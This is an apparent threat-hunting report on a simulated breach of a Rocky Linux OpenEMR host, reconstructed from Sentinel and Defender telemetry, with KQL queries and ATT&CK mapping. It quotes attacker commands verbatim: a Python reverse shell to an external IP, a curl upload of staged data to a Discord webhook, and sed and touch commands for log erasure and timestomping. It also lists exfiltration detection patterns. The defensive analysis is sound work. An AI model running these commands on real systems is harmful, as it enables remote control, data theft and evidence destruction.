# Rocky Clinic OpenEMR Breach — Threat Hunt Report

## Overview

This project documents a threat hunt investigation into a simulated compromise of the Rocky Clinic OpenEMR environment. The investigation focused on attacker activity across Linux host telemetry, Docker/OpenEMR artifacts, identity abuse, persistence, command and control, data staging, exfiltration, and anti-forensics.

The investigation was performed using Microsoft Sentinel and Microsoft Defender XDR telemetry, including:

- `DeviceProcessEvents`
- `DeviceFileEvents`
- `DeviceLogonEvents`
- `DeviceNetworkEvents`
- `AlertInfo`
- `AlertEvidence`

The goal was to reconstruct the attacker timeline, identify key tradecraft, and map observed behavior to MITRE ATT&CK techniques.

---

## Environment

| Item | Value |
|---|---|
| Host | `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net` |
| Operating System | Rocky Linux |
| Application | OpenEMR |
| Runtime | Docker |
| Investigation Window | `2026-02-04` to `2026-02-14` UTC |
| Primary Abused Account | `it.admin` |
| Unauthorized Local Account | `system` |
| External Infrastructure | `20.62.27.80` |
| Successful SaaS Exfil Endpoint | `162.159.135.232:443` |

---

## Executive Summary

The attacker gained access to the Rocky Clinic host using the `it.admin` account and performed host, OS, Docker, and OpenEMR discovery. After identifying where OpenEMR and database data physically lived on disk, the attacker staged data in an operational-looking directory, established persistence through both identity and systemd service mechanisms, launched a Python reverse shell, and attempted data exfiltration.

Initial transfer attempts using SSH/SFTP/SCP encountered connection issues. The attacker then pivoted to a third-party SaaS exfiltration method by uploading the staged archive through a Discord webhook using `curl`.

After exfiltration, the attacker performed selective log cleanup using `sed -i` and timestomped `/var/log/messages` to blur the event timeline. Microsoft Defender raised alerts for suspicious timestamp modification, classifying the activity as Indicator Removal and Timestomp.

---

## Investigation Narrative

### 1. Suspicious Account Activity

The investigation centered on suspicious activity from the `it.admin` account. Successful logons were grouped by account and source IP, with known-good source activity removed to isolate abnormal access patterns.

One of the earliest behavioral indicators was the attacker checking who else was on the host:

```bash
w
```

This was followed by host, session, and environment discovery.

---

### 2. OS and Host Discovery

The attacker queried common Linux release files to fingerprint the operating system:

```bash
cat /etc/os-release /etc/redhat-release /etc/rocky-release /etc/system-release
```

This confirmed the host was running Rocky Linux.

The attacker then escalated into a root login shell:

```bash
sudo -i
```

This activity showed a move from basic discovery into privileged host-level operations.

---

### 3. Docker and OpenEMR Discovery

The attacker identified Docker as the application runtime and inspected OpenEMR-related containers.

One key container discovery command was:

```bash
docker inspect openemr-mariadb
```

The attacker later confirmed Docker volume storage with recursive file enumeration:

```bash
find /var/lib/docker/volumes -maxdepth 3 -type f
```

This showed the attacker moving beyond logical container abstractions and confirming where persistent data lived on the host filesystem.

Relevant Docker volume paths included:

```text
/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data
/var/lib/docker/volumes/r0ckyyy335_openemr_sites/_data
```

<img width="1512" height="766" alt="Screenshot 2026-06-11 at 7 01 38 PM" src="https://github.com/user-attachments/assets/8c823c93-95e8-4395-a541-f4272d05b99a" />


---

### 4. Data Staging

The attacker staged data in an operational-looking directory:

```text
/var/lib/integrations
```

This location blended into the environment better than obvious staging paths such as `/tmp` or a user home directory.

The staged archive used for transfer was:

```text
integration_state_2026-02-10_22-00-01.tar.gz
```

This archive later appeared in exfiltration telemetry.

---

### 5. Unauthorized Identity Persistence

The attacker created a local account designed to blend in with normal system assumptions:

```text
system
```

This account was identified by grouping successful logons after removing known-good source IP activity.

The identity creation did not use obvious account-management tools like `useradd` or `adduser`. Instead, the investigation pivoted from writes to local identity files:

```text
/etc/passwd
/etc/shadow
```

to the initiating process responsible for modifying them.

This behavior aligns with local account creation persistence and attempts to avoid simple detections based only on standard account-management binaries.

---

### 6. Systemd Persistence

The attacker created a host-level systemd unit file under:

```text
/etc/systemd/system/
```

The persistence artifact was:

```text
integration-monitor.service
```

The initial file creation avoided editor telemetry and used a simple binary:

```bash
cat
```

Later edits were performed with `vim`, but the original no-editor creation event was tied to `cat`.

The service was later used to launch outbound control activity.

<img width="3020" height="1546" alt="image" src="https://github.com/user-attachments/assets/4bb17f1c-872e-4b21-b5f5-1257ec331c3c" />


---

### 7. Reverse Shell Execution

After activating the malicious systemd service, the attacker launched a Python reverse shell.

Observed reverse shell command:

```bash
/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("20.62.27.80",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

The reverse shell then spawned an interactive shell.

Observed process chain:

| Process | Description |
|---|---|
| `python3.9` | Reverse shell process |
| `/bin/sh -i` | Interactive shell spawned by reverse shell |
| `whoami` | First observed interactive command |

This activity showed that outbound control was established from the host and that the attacker obtained an interactive command session.

---

### 8. Failed Transfer Attempt

Before succeeding, the attacker attempted a structured transfer using SSH/SFTP tooling. Network telemetry showed a failed connection where the parent process was `scp`.

Failed transfer initiating command line:

```bash
/usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l streetrack -s -- 20.62.27.80 sftp
```

This suggests the attacker initially attempted a more traditional file transfer path before pivoting.

---

### 9. Successful SaaS Exfiltration Pivot

After failed SSH/SFTP/SCP attempts, the attacker pivoted to a third-party SaaS platform: Discord webhooks.

The successful exfiltration command used `curl`:

```bash
curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/[REDACTED]
```

The webhook token was redacted to avoid publishing a usable endpoint.

The successful exfiltration endpoint observed in network telemetry was:

```text
162.159.135.232:443
```

This activity aligns with exfiltration over a legitimate cloud/SaaS service to blend with normal HTTPS traffic.

---

### 10. Selective Log Erasure

Instead of wiping all logs, the attacker selectively removed traces from two system log files:

```text
/var/log/secure
/var/log/messages
```

The attacker used the canonical Linux in-place text manipulation tool:

```bash
sed
```

Example cleanup activity:

```bash
sed -i /it.admin/d /var/log/messages
sed -i /system/d /var/log/messages
sed -i /it.admin/d /var/log/secure
```

This showed deliberate cleanup rather than broad log destruction.

---

### 11. Timeline Distortion / Timestomping

The attacker backdated `/var/log/messages` using a timestamp-setting command.

Observed timestomp command:

```bash
sudo touch -d "2026-02-06 12:00:00" /var/log/messages
```

Forged timestamp applied to `/var/log/messages`:

```text
2026-02-06 12:00:00
```

This was likely intended to blur causality and make the modified log file appear older than the actual cleanup activity.

---

### 12. EDR Alert Classification

Microsoft Defender raised alerts for suspicious timestamp modification.

Alert title:

```text
Suspicious timestamp modification
```

The `AttackTechniques` field recorded:

```text
["Indicator Removal (T1070)","Timestomp (T1070.006)"]
```

This confirmed that the EDR classified the activity as both general indicator removal and the specific Timestomp sub-technique.

---

## Key Findings

| Category | Finding |
|---|---|
| Abused account | `it.admin` |
| Unauthorized account | `system` |
| Runtime | Docker |
| Persistence artifact | `integration-monitor.service` |
| No-editor creation binary | `cat` |
| Reverse shell method | Python socket + `dup2` one-liner |
| Staging directory | `/var/lib/integrations` |
| Staged archive | `integration_state_2026-02-10_22-00-01.tar.gz` |
| Successful exfil method | `curl` to Discord webhook |
| Successful exfil endpoint | `162.159.135.232:443` |
| Log manipulation tool | `sed` |
| Forged log timestamp | `2026-02-06 12:00:00` |

---

## Indicators of Compromise

### Accounts

| Account | Description |
|---|---|
| `it.admin` | Abused administrative account |
| `system` | Unauthorized local persistence account |
| `streetrack` | Remote transfer destination account used during exfil attempts |

### Files and Directories

| Artifact | Description |
|---|---|
| `/etc/systemd/system/integration-monitor.service` | Systemd persistence unit |
| `/var/lib/integrations` | Data staging directory |
| `integration_state_2026-02-10_22-00-01.tar.gz` | Staged archive |
| `/var/log/messages` | Log file selectively edited and timestomped |
| `/var/log/secure` | Log file selectively edited |

### Network Indicators

| Indicator | Description |
|---|---|
| `20.62.27.80:443` | Reverse shell destination |
| `20.62.27.80:22` | Failed SSH/SFTP/SCP transfer destination |
| `162.159.135.232:443` | Successful SaaS exfil endpoint |
| `discord.com/api/webhooks/[REDACTED]` | Redacted SaaS webhook path |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Discovery | System Information Discovery | `T1082` | OS release file reads |
| Discovery | File and Directory Discovery | `T1083` | Docker volume enumeration |
| Privilege Escalation | Valid Accounts / Sudo Abuse | N/A | `sudo -i` |
| Persistence | Create Account: Local Account | `T1136.001` | Unauthorized `system` account |
| Persistence | Create or Modify System Process: Systemd Service | `T1543.002` | `integration-monitor.service` |
| Execution | Command and Scripting Interpreter: Python | `T1059.006` | Python reverse shell |
| Command and Control | Web Protocols | `T1071.001` | Reverse shell over TCP/443 |
| Collection | Local Data Staging | `T1074.001` | `/var/lib/integrations` and staged archive |
| Exfiltration | Exfiltration to Cloud Storage / Cloud Service | `T1567.002` | Discord webhook upload |
| Defense Evasion | Indicator Removal | `T1070` | Selective log deletion |
| Defense Evasion | Timestomp | `T1070.006` | Backdated `/var/log/messages` |

---

## KQL Queries Used

### Group Successful Logons by Account

```kusto
let KnownGoodIP = "68.53.47.150";
DeviceLogonEvents
| where DeviceName startswith "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where ActionType == "LogonSuccess"
| where coalesce(RemoteIP, "") != KnownGoodIP
| summarize
    Count=count(),
    FirstSeen=min(TimeGenerated),
    LastSeen=max(TimeGenerated),
    RemoteIPs=make_set(RemoteIP, 20),
    LogonTypes=make_set(LogonType, 10)
  by AccountName
| order by Count asc
```

---

### Identify Docker Volume Enumeration

```kusto
DeviceProcessEvents
| where DeviceName startswith "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where ProcessCommandLine has "/var/lib/docker/volumes"
| project TimeGenerated,
          AccountName,
          FileName,
          ProcessCommandLine,
          InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

### Find Systemd Persistence Unit Creation

```kusto
DeviceFileEvents
| where DeviceName startswith "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where FolderPath startswith "/etc/systemd/system/"
| where ActionType in~ ("FileCreated", "FileModified", "FileRenamed")
| project TimeGenerated,
          ActionType,
          FileName,
          FolderPath,
          InitiatingProcessAccountName,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

### Find Python Reverse Shell

```kusto
DeviceProcessEvents
| where DeviceName startswith "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where ProcessCommandLine contains "socket"
   or ProcessCommandLine contains "dup2"
   or ProcessCommandLine contains "subprocess.call"
   or ProcessCommandLine contains "20.62.27.80"
| project TimeGenerated,
          AccountName,
          ProcessId,
          FileName,
          ProcessCommandLine,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

### Identify Failed Transfer Attempt

```kusto
DeviceNetworkEvents
| where DeviceName startswith "rocky83"
| where TimeGenerated between (
    datetime(2026-02-11 04:20:00)
    ..
    datetime(2026-02-11 04:30:00)
)
| where ActionType has "Failed"
   or ActionType has "ConnectionFailed"
| project TimeGenerated,
          ActionType,
          RemoteIP,
          RemotePort,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine,
          InitiatingProcessParentFileName
| order by TimeGenerated asc
```

---

### Identify Successful SaaS Exfiltration

```kusto
DeviceNetworkEvents
| where DeviceName startswith "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where InitiatingProcessCommandLine contains "discord.com/api/webhooks"
   or InitiatingProcessCommandLine contains "integration_state_2026-02-10_22-00-01.tar.gz"
| project TimeGenerated,
          ActionType,
          RemoteIP,
          RemotePort,
          Endpoint=strcat(RemoteIP, ":", tostring(RemotePort)),
          InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

### Detect Selective Log Deletion

```kusto
DeviceProcessEvents
| where DeviceName startswith "rocky83"
| where TimeGenerated between (
    datetime(2026-02-11 16:13:00)
    ..
    datetime(2026-02-11 16:16:00)
)
| where FileName =~ "sed"
| where ProcessCommandLine has "-i"
| where ProcessCommandLine has_any ("/var/log/secure", "/var/log/messages")
| project TimeGenerated,
          AccountName,
          ProcessId,
          FileName,
          ProcessCommandLine,
          InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

### Detect Timestomping

```kusto
DeviceProcessEvents
| where DeviceName startswith "rocky83"
| where TimeGenerated between (
    datetime(2026-02-11 16:13:00)
    ..
    datetime(2026-02-11 16:30:00)
)
| where ProcessCommandLine contains "/var/log/messages"
   or ProcessCommandLine contains "touch -d"
   or ProcessCommandLine contains "2026-02-06 12:00:00"
| project TimeGenerated,
          AccountName,
          FileName,
          ProcessCommandLine,
          InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

### Read Alert Technique Classification

```kusto
AlertInfo
| where Timestamp between (
    datetime(2026-02-11 16:13:00)
    ..
    datetime(2026-02-11 16:40:00)
)
| where Title has "Suspicious timestamp modification"
| project Timestamp,
          AlertId,
          Title,
          AttackTechniques
| order by Timestamp asc
```

---

## Detection Opportunities

### 1. Non-Standard Account Creation

Alert when `/etc/passwd` or `/etc/shadow` is modified by a process other than approved account-management tools.

Suspicious examples:

```text
/etc/passwd modified by non-useradd process
/etc/shadow modified by non-passwd process
```

---

### 2. Suspicious Systemd Unit Creation

Monitor writes to:

```text
/etc/systemd/system/
```

Especially when the initiating process is a shell utility such as:

```text
cat
echo
tee
vim
nano
```

---

### 3. Python Reverse Shell Behavior

Detect Python command lines containing combinations of:

```text
socket
connect
dup2
subprocess.call
/bin/sh
/bin/bash
```

---

### 4. Docker Volume Enumeration

Alert on recursive enumeration of Docker volume storage:

```text
/var/lib/docker/volumes
```

Example suspicious command:

```bash
find /var/lib/docker/volumes -maxdepth 3 -type f
```

---

### 5. Archive Staging in Operational-Looking Directories

Watch for `.tar`, `.tar.gz`, `.zip`, or similar archive files written to unusual application or integration directories.

Example suspicious staging location:

```text
/var/lib/integrations
```

---

### 6. SaaS / Webhook Uploads

Detect `curl` uploads to webhook-style URLs.

Suspicious command patterns:

```bash
curl -F file=@...
curl --upload-file ...
curl --data-binary @...
```

Suspicious destinations:

```text
discord.com/api/webhooks
hooks.slack.com
transfer.sh
file.io
0x0.st
```

---

### 7. Selective Log Deletion

Alert on in-place modification of system logs:

```bash
sed -i ... /var/log/secure
sed -i ... /var/log/messages
```

---

### 8. Timestomping

Alert on timestamp modification against system logs.

Suspicious examples:

```bash
touch -d "YYYY-MM-DD HH:MM:SS" /var/log/messages
touch -t YYYYMMDDHHMM.SS /var/log/messages
```

---

## Lessons Learned

This investigation showed how attackers can blend into Linux environments by abusing normal-looking names, directories, and administrative tooling.

Many individual actions appeared low-noise:

- `cat` creating a systemd unit
- `find` enumerating Docker volumes
- `curl` uploading to a SaaS endpoint
- `sed -i` modifying logs
- `touch -d` changing timestamps

However, when chained together, these actions formed a clear intrusion narrative:

1. Access with a valid account
2. Host and container discovery
3. Local identity persistence
4. Systemd service persistence
5. Python reverse shell
6. Archive staging
7. Failed direct transfer
8. SaaS exfiltration
9. Selective cleanup
10. Timestomping

The key defensive takeaway is that Linux host telemetry should be monitored for combinations of small signals rather than only high-confidence single events.

---

## Final Notes

This project was completed as a hands-on threat hunting investigation using Microsoft Sentinel and Defender XDR telemetry. The focus was not only answering individual challenge prompts, but building a defensible incident narrative from process, file, logon, network, and alert evidence.

Sensitive values such as webhook tokens were intentionally redacted before publication.
